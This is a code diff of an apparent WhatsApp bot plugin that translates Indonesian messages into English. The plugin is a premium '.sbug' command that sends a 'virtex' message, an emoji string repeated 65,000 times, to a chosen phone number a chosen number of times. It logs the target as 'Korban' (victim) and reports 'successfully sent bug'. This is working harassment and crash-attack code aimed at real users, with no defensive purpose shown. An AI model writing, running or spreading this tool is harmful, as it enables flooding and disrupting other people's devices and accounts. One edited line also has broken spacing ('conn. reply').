@@ -4,15 +4,15 @@ let virtex = emojis.repeat(65000)
         global.dfail('premium', m, conn)
         throw false
     }
-    if (!text) throw `uhm... siapa yg mau diserang?\n contoh penggunaan:\n *${usedPrefix + command}* nomor\n Example: *${usedPrefix + command}* 6281234567890`;
+    if (!text) throw `uhm... who wants to attack?\n usage example:\n *${usedPrefix + command}* number\n Example: *${usedPrefix + command}* `;
     let [orang, jumlah] = text.split(',')
-    if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882...., 10'
-    m.reply('_sedang diproses..._')
+    if (!jumlah) throw 'Enter the amount.\n\nExample\n.sbug 62882...., 10'
+    m.reply('_being processed..._')
     let who
     try {
         if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         else who = orang.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        if (who.length <= 20) throw 'balas atau tag orang yg mau di serang!';
+        if (who.length <= 20) throw 'Reply or tag the person you want to attack!';
         conn.logger.info(`\nKorban: ${who}\nJumlah: ${jumlah}`)
         for (let i = jumlah; i > 1; i--) {
             if (i !== 0) await conn.sendMessage(who, { text: virtex }, {
@@ -28,7 +28,7 @@ let virtex = emojis.repeat(65000)
                 }
             })
         }
-        conn.reply(m.chat, `sukses mengirim bug ke @${who.split('@')[0]}`, m, { mentions: [who] })
+conn. reply(m. chat, `successfully sent bug to @${who.split('@')[0]}`, m, { mentions: [who] })
     } catch (e) {
         console.error(e)
         throw e
